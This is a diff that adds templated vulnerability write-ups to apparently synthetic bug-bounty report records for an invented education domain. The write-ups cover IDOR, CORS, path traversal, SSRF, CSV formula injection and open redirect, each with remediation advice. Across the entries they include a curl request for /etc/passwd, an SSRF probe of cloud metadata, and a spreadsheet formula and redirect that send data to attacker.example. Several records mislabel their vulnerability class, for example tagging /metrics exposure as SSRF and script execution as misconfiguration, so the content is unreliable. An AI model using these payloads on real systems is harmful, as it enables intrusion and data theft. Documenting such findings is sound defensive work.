@@ -66,7 +66,8 @@
           "offset": "5d 7h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.waldlicht-bildung.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -165,7 +166,8 @@
           "offset": "1d 2h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.waldlicht-bildung.foo/v2/me`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -263,7 +265,8 @@
           "offset": "23h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.waldlicht-bildung.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -395,7 +398,8 @@
           "offset": "3d 22h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.waldlicht-bildung.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -508,7 +512,8 @@
           "offset": "4d 15h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.waldlicht-bildung.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -639,7 +644,8 @@
           "offset": "3d 23h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.waldlicht-bildung.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -766,7 +772,8 @@
           "offset": "9d 12h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.waldlicht-bildung.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -901,7 +908,8 @@
           "offset": "4d 12h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.waldlicht-bildung.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1041,7 +1049,8 @@
           "offset": "5d 10h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.waldlicht-bildung.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1187,7 +1196,8 @@
           "offset": "4d 5h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.waldlicht-bildung.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1289,7 +1299,8 @@
           "offset": "19h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.waldlicht-bildung.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1417,7 +1428,8 @@
           "offset": "7d 16h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.waldlicht-bildung.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1549,7 +1561,8 @@
           "offset": "3h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.waldlicht-bildung.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1669,7 +1682,8 @@
           "offset": "13h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.waldlicht-bildung.foo/export`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1813,7 +1827,8 @@
           "offset": "8d 23h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.waldlicht-bildung.foo/export`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1933,7 +1948,8 @@
           "offset": "2d 12h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.waldlicht-bildung.foo/api/import`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2063,7 +2079,8 @@
           "offset": "3d 2h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.waldlicht-bildung.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2186,7 +2203,8 @@
           "offset": "1d 13h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.waldlicht-bildung.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2272,7 +2290,8 @@
           "offset": "1d 15h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.waldlicht-bildung.foo/admin/items`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -2424,7 +2443,8 @@
           "offset": "8d 6h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.waldlicht-bildung.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2536,7 +2556,8 @@
           "offset": "1d 17h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.waldlicht-bildung.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2660,7 +2681,8 @@
           "offset": "20h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.waldlicht-bildung.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2799,7 +2821,8 @@
           "offset": "3d 5h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.waldlicht-bildung.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2930,7 +2953,8 @@
           "offset": "1d 20h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.waldlicht-bildung.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3126,7 +3150,8 @@
           "offset": "7d 23h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.waldlicht-bildung.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3277,7 +3302,8 @@
           "offset": "4d 3h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.waldlicht-bildung.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3402,7 +3428,8 @@
           "offset": "3d 5h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.waldlicht-bildung.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3505,7 +3532,8 @@
           "offset": "2d 2h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.waldlicht-bildung.foo/statements/`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3644,7 +3672,8 @@
           "offset": "3d 14h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.waldlicht-bildung.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3767,7 +3796,8 @@
           "offset": "3d 4h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.waldlicht-bildung.foo/v2/me`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3907,7 +3937,8 @@
           "offset": "3d 19h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.waldlicht-bildung.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3988,7 +4019,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
